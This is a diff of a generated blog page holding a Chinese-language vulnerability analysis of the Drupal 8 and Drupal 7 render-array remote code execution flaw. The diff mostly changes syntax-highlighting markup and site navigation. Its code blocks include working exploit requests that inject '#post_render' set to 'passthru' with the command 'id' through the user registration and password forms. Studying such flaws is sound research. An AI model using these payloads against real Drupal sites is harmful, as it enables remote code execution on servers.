@@ -208,7 +208,7 @@
 <p>其次，这个参数在注册点处可控。</p>
 <p>那么，接下来带大家看看执行点与操控点。</p>
 <h3 id="执行点"><a href="#执行点" class="headerlink" title="执行点"></a>执行点</h3><p>首先，我们先看一下远程代码执行点。通过查阅<code>Drupal</code>的代码和文档，可以知道<code>Drupal Render API</code>对于请求中存在<code>#</code>开头的参数会进行特殊处理。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 链接 https://www.drupal.org/docs/8/api/form-api/form-render-elements</span><br><span class="line"></span><br><span class="line">HTML5 Form Render Elements</span><br><span class="line">The HTML5 elements are:</span><br><span class="line"></span><br><span class="line">&apos;#type&apos; =&gt; &apos;tel&apos;</span><br><span class="line">&apos;#type&apos; =&gt; &apos;email&apos;</span><br><span class="line">&apos;#type&apos; =&gt; &apos;number&apos;</span><br><span class="line">&apos;#type&apos; =&gt; &apos;date&apos;</span><br><span class="line">&apos;#type&apos; =&gt; &apos;url&apos;</span><br><span class="line">&apos;#type&apos; =&gt; &apos;search&apos;</span><br><span class="line">&apos;#type&apos; =&gt; &apos;range&apos;</span><br><span class="line">Using these elements as opposed to requesting data in plain textfields is preferable because devices can pull up the proper input methods for them, such as when a telephone number is requested, a keypad screen would display on a device.</span><br><span class="line"></span><br><span class="line">Other useful render elements</span><br><span class="line">details: The &apos;#type&apos; =&gt; &apos;details&apos; element is a grouping element with a summary.</span><br><span class="line">language_select: The &apos;#type&apos; =&gt; &apos;language_select&apos; element is a language selector to make it easy to put language configuration on forms.</span><br><span class="line">dropbutton: The &apos;#type&apos; =&gt; &apos;dropbutton&apos; provides a generic select list with a dropbutton. See also the &apos;#type&apos; =&gt; &apos;operations&apos; element.</span><br><span class="line">operations: The &apos;#type&apos; =&gt; &apos;operations&apos; element provides a list of available operations, which you can commonly find in entity configuration administrative screens, such as at admin/structure/types.</span><br><span class="line">Other entities with autocomplete: The &apos;#type&apos; =&gt; &apos;entity_autocomplete&apos; element allow to select an entity of a specific type.</span><br><span class="line">Check out namespace Drupal\Core\Render\Element for all the core provided elements.</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 链接 https://www.drupal.org/docs/8/api/form-api/form-render-elements</span></span><br><span class="line"></span><br><span class="line">HTML5 Form Render Elements</span><br><span class="line">The HTML5 elements are:</span><br><span class="line"></span><br><span class="line"><span class="string">'#type'</span> =&gt; <span class="string">'tel'</span></span><br><span class="line"><span class="string">'#type'</span> =&gt; <span class="string">'email'</span></span><br><span class="line"><span class="string">'#type'</span> =&gt; <span class="string">'number'</span></span><br><span class="line"><span class="string">'#type'</span> =&gt; <span class="string">'date'</span></span><br><span class="line"><span class="string">'#type'</span> =&gt; <span class="string">'url'</span></span><br><span class="line"><span class="string">'#type'</span> =&gt; <span class="string">'search'</span></span><br><span class="line"><span class="string">'#type'</span> =&gt; <span class="string">'range'</span></span><br><span class="line">Using these elements <span class="keyword">as</span> opposed <span class="built_in">to</span> requesting data <span class="keyword">in</span> plain textfields is preferable because devices can pull up <span class="keyword">the</span> proper input methods <span class="keyword">for</span> them, such <span class="keyword">as</span> when <span class="keyword">a</span> telephone <span class="built_in">number</span> is requested, <span class="keyword">a</span> keypad screen would display <span class="keyword">on</span> <span class="title">a</span> <span class="title">device</span>.</span><br><span class="line"></span><br><span class="line">Other useful render elements</span><br><span class="line">details: The <span class="string">'#type'</span> =&gt; <span class="string">'details'</span> <span class="keyword">element</span> is <span class="keyword">a</span> grouping <span class="keyword">element</span> <span class="keyword">with</span> <span class="keyword">a</span> summary.</span><br><span class="line">language_select: The <span class="string">'#type'</span> =&gt; <span class="string">'language_select'</span> <span class="keyword">element</span> is <span class="keyword">a</span> language selector <span class="built_in">to</span> make <span class="keyword">it</span> easy <span class="built_in">to</span> <span class="built_in">put</span> language configuration <span class="keyword">on</span> <span class="title">forms</span>.</span><br><span class="line">dropbutton: The <span class="string">'#type'</span> =&gt; <span class="string">'dropbutton'</span> provides <span class="keyword">a</span> generic select list <span class="keyword">with</span> <span class="keyword">a</span> dropbutton. See also <span class="keyword">the</span> <span class="string">'#type'</span> =&gt; <span class="string">'operations'</span> <span class="keyword">element</span>.</span><br><span class="line">operations: The <span class="string">'#type'</span> =&gt; <span class="string">'operations'</span> <span class="keyword">element</span> provides <span class="keyword">a</span> list <span class="keyword">of</span> available operations, which you can commonly find <span class="keyword">in</span> entity configuration administrative screens, such <span class="keyword">as</span> <span class="keyword">at</span> admin/structure/types.</span><br><span class="line">Other entities <span class="keyword">with</span> autocomplete: The <span class="string">'#type'</span> =&gt; <span class="string">'entity_autocomplete'</span> <span class="keyword">element</span> allow <span class="built_in">to</span> select <span class="keyword">an</span> entity <span class="keyword">of</span> <span class="keyword">a</span> specific type.</span><br><span class="line">Check out namespace Drupal\Core\Render\Element <span class="keyword">for</span> all <span class="keyword">the</span> core provided elements.</span><br></pre></td></tr></table></figure>
 <p>然后我们看看渲染参数的执行渲染过程，</p>
 <p>在Drupal 中<code>\core\lib\Druple\Core\Render\Render.php</code>中的函数doRender，</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">doRender</span><span class="params">(&amp;$elements, $is_root_call = FALSE)</span> </span>&#123;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
@@ -238,7 +238,7 @@
 <p>到这一步，我们发现一个类似<code>render</code>的名字，然后我们一路跟进，发现果然这里最后调用了<code>doRrender</code>并且将请求中的数据传入<code>$elements</code>，这使得我们第一步发现的代码执行的渲染数组<code>$elements</code>数组可控。</p>
 <p>最后我们总结以下思路如下：</p>
 <p>在<code>Render.php</code>中存在代码执行点，可利用的执行函数为<code>call_user_func</code>，函数将第一个参数作为回调函数调用，回调函数为<code>$elements[&#39;#post_render&#39;]</code>的值，其他参数为<code>$elements[&#39;#children&#39;]</code>和<code>$elements</code>数组，而在ManagedFile.php处可以通过请求注入参数到<code>$elements</code>中执行.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1</span><br><span class="line">Host: 0.0.0.0:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 105</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=passthru&amp;mail[#type]=balabala&amp;mail[#markup]=id</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 0.0.0.0:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 105</span><br><span class="line"></span><br><span class="line">form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=passthru&amp;mail[#type]=balabala&amp;mail[#markup]=id</span><br></pre></td></tr></table></figure>
 <p>通过<code>#post_render</code>注入回调函数passthru，通过<code>#markup</code>注入passthru参数，这就是我们整个的攻击思路。其他参数的作用是调用Drupal的相关API返回渲染表单。</p>
 <h2 id="Drupal7-攻击思路"><a href="#Drupal7-攻击思路" class="headerlink" title="Drupal7 攻击思路"></a>Drupal7 攻击思路</h2><p>由于7和8的差异，我调试了一下午才知晓这个漏洞的整个流程。</p>
 <p><strong>首先当发送一个请求时，drupal会先搜索一下数据库中是否存在你的表单记录的相关信息</strong>，What Fuck，记录?</p>
@@ -293,7 +293,7 @@
 <h4 id="将form-build-id注入数据库"><a href="#将form-build-id注入数据库" class="headerlink" title="将form_build_id注入数据库"></a>将<code>form_build_id</code>注入数据库</h4><ul>
 <li>根据PoC，我们传入<code>_triggering_element_name=name</code> ，这里<code>/cve-drupal-7.57/?q=user/password</code>等同于<code>/cve-drupal-7.57/user/password</code></li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /cve-drupal-7.57/?q=user/password HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: Drupal.toolbar.collapsed=0; Phpstorm-aaa184c4=c189f76e-2434-4686-8e5a-1cc4885784ca; has_js=1; XDEBUG_SESSION=14141</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 149</span><br><span class="line"></span><br><span class="line">name=menze3&amp;form_build_id=form-TZ-hbGmj4sUfJXhn8_nPJe4YuxGs8NsL1x7c0gEgLB8&amp;form_id=user_pass&amp;op=E-mail%2Bnew%2Bpassword&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cve-drupal-7.57/?q=user/password</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span>: Drupal.toolbar.collapsed=0; Phpstorm-aaa184c4=c189f76e-2434-4686-8e5a-1cc4885784ca; has_js=1; XDEBUG_SESSION=14141</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 149</span><br><span class="line"></span><br><span class="line">name=menze3&amp;form_build_id=form-TZ-hbGmj4sUfJXhn8_nPJe4YuxGs8NsL1x7c0gEgLB8&amp;form_id=user_pass&amp;op=E-mail%2Bnew%2Bpassword&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure>
 <p><img src="C:\Users\Menzel3\AppData\Local\Temp\1533887154308.png" alt="1533707894575"></p>
 <p><img src="C:\Users\Menzel3\AppData\Local\Temp\1533887165086.png" alt="1533887165086"></p>
 <p><img src="C:\Users\Menzel3\AppData\Local\Temp\1533887179141.png" alt="1533887179141"></p>
@@ -301,14 +301,14 @@
 <li>看到进入这个分支，进入<code>form_set_cache()</code>方法 写入数据库中插入缓存<code>form_build_id</code> </li>
 </ul>
 <p>好了，我们注入半个POC</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drupal-7.57/?q=user%2Fpassword&amp;name%5B%23post_render%5D%5B%5D=passthru&amp;name%5B%23markup%5D=id&amp;name%5B%23type%5D=markup</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drupal<span class="number">-7.57</span>/?q=user<span class="symbol">%2</span>Fpassword&amp;name<span class="symbol">%5</span>B<span class="symbol">%23</span>post_render<span class="symbol">%5</span>D<span class="symbol">%5</span>B<span class="symbol">%5</span>D=passthru&amp;name<span class="symbol">%5</span>B<span class="symbol">%23</span>markup<span class="symbol">%5</span>D=id&amp;name<span class="symbol">%5</span>B<span class="symbol">%23</span><span class="keyword">type</span><span class="symbol">%5</span>D=markup</span><br><span class="line"></span><br><span class="line">form_id=user_pass&amp;_triggering_element_name=name</span><br></pre></td></tr></table></figure>
 <p>我们打开数据库，扒一扒插入的数据</p>
 <p><img src="C:\Users\Menzel3\AppData\Local\Temp\1533887197910.png" alt="1533887197910"></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">第一行</span><br><span class="line">cid:</span><br><span class="line">form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqI</span><br><span class="line"></span><br><span class="line">data:</span><br><span class="line">drupal<span class="number">-7.57</span>/?q=user%<span class="number">2</span>Fpassword&amp;name%<span class="number">5</span>B%<span class="number">23</span>post_render%<span class="number">5</span>D%<span class="number">5</span>B%<span class="number">5</span>D=passthru&amp;name%<span class="number">5</span>B%<span class="number">23</span>markup%<span class="number">5</span>D=id&amp;name%<span class="number">5</span>B%<span class="number">23</span>type%<span class="number">5</span>D=markup<span class="string">";s:15:"</span><span class="comment">#theme_wrappers";a:1:&#123;i:0;s:4:"form";&#125;s:5:"#tree";b:0;s:8:"#parents";a:0:&#123;&#125;s:9:"#validate";a:1:&#123;i:0;s:18:"user_pass_validate";&#125;s:7:"#submit";a:1:&#123;i:0;s:16:"user_pass_submit";&#125;s:6:"#theme";a:1:&#123;i:0;s:9:"user_pass";&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">expire:</span><br><span class="line"><span class="number">1533738649</span></span><br><span class="line"></span><br><span class="line">created:</span><br><span class="line"><span class="number">1533717049</span></span><br><span class="line"></span><br><span class="line">serialized:</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line">第二行同</span><br><span class="line"></span><br><span class="line">form_state_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqI</span><br><span class="line"></span><br><span class="line">a:<span class="number">6</span>:&#123;s:<span class="number">10</span>:<span class="string">"build_info"</span>;a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"args"</span>;a:<span class="number">0</span>:&#123;&#125;s:<span class="number">7</span>:<span class="string">"form_id"</span>;s:<span class="number">9</span>:<span class="string">"user_pass"</span>;s:<span class="number">5</span>:<span class="string">"files"</span>;a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"menu"</span>;s:<span class="number">27</span>:<span class="string">"modules/user/user.pages.inc"</span>;&#125;&#125;s:<span class="number">10</span>:<span class="string">"programmed"</span>;b:<span class="number">0</span>;s:<span class="number">30</span>:<span class="string">"programmed_bypass_access_check"</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"cache"</span>;b:<span class="number">0</span>;s:<span class="number">13</span>:<span class="string">"process_input"</span>;b:<span class="number">1</span>;s:<span class="number">13</span>:<span class="string">"invalid_token"</span>;b:<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">1533738649</span></span><br><span class="line"></span><br><span class="line"><span class="number">1533717049</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>是序列化数据没错了，而且是将我们的Get请求数据存储。</p>
 <h3 id="代码执行现场"><a href="#代码执行现场" class="headerlink" title="代码执行现场"></a>代码执行现场</h3><p>既然我们完成了第一个FLAG，现在只需要让他执行第一个FLAG.吼吼吼，小激动。</p>
 <p>这次我们请求和Drupal8的漏洞点，还是处理图片那个点，这里我先列出POC</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  ?q=file/ajax/name/%23value/form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqI</span><br><span class="line">post: form_build_id:form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqI</span><br></pre></td></tr></table></figure>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span>:  ?q=<span class="built_in">file</span>/ajax/name/%<span class="number">23</span><span class="built_in">value</span>/form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqI</span><br><span class="line"><span class="built_in">post</span>: form_build_id:form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqI</span><br></pre></td></tr></table></figure>
 <p>（后面是CID号，这里我直接从上面取了一个），后续我会一点一点解释。我们这里跟随一下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">menu_get_item</span><span class="params">($path = NULL, $router_item = NULL)</span> </span>&#123;</span><br><span class="line">  $router_items = &amp;drupal_static(<span class="keyword">__FUNCTION__</span>);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($path)) &#123;</span><br><span class="line">    $path = $_GET[<span class="string">'q'</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($router_item)) &#123;</span><br><span class="line">    $router_items[$path] = $router_item;<span class="comment"># 将q的值取为键，而本身作为值，也就是NULL.</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>($router_items[$path])) &#123;</span><br><span class="line">    <span class="comment">// Rebuild if we know it's needed, or if the menu masks are missing which</span></span><br><span class="line">    <span class="comment">// occurs rarely, likely due to a race condition of multiple rebuilds.</span></span><br><span class="line">    <span class="keyword">if</span> (variable_get(<span class="string">'menu_rebuild_needed'</span>, <span class="keyword">FALSE</span>) || !variable_get(<span class="string">'menu_masks'</span>, <span class="keyword">array</span>())) &#123;</span><br><span class="line">      <span class="keyword">if</span> (_menu_check_rebuild()) &#123;</span><br><span class="line">        menu_rebuild();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $original_map = arg(<span class="keyword">NULL</span>, $path); <span class="comment"># 将file/ajax/name/%23value/form_form-YllITr_mCK2tHBg52ah0hVWqSMtOWwBXceiHVlNlyqI解析出一个数组，如下图</span></span><br></pre></td></tr></table></figure>
 <p><img src="C:\Users\Menzel3\AppData\Local\Temp\1533887216194.png" alt="1533887216194"></p>
@@ -448,18 +448,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/08/16/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/08/02/Linux上神奇的inode编号/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Hello World
+          Linux/unix上神奇的inode编号
         
       </div>
     </a>
   
   
-    <a href="/2018/08/02/Linux上神奇的inode编号/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Linux/unix上神奇的inode编号</div>
+    <a href="/2018/07/31/dockerfile使用/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">DockerFile使用</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -601,107 +601,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">模板</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF杂项</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">JSP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">基础</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">MIPS汇编</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Maven</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">编码</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">编程</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工具</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">CURL</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">install</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">安装</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">配置</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">docker</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">扫描</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">内网</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">MYSQL</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">二进制</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">question</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">小文</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -713,7 +613,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+                <a href="javascript:void(0)" class="js-tag color3">工具</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CURL</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -722,6 +626,78 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">MIPS汇编</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">MYSQL</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Maven</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">编程</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">模板</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">docker</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">扫描</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PWN</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">二进制</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">随笔</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">小文</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">编码</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">question</a>
               </li>
             
             <div class="clearfix"></div>
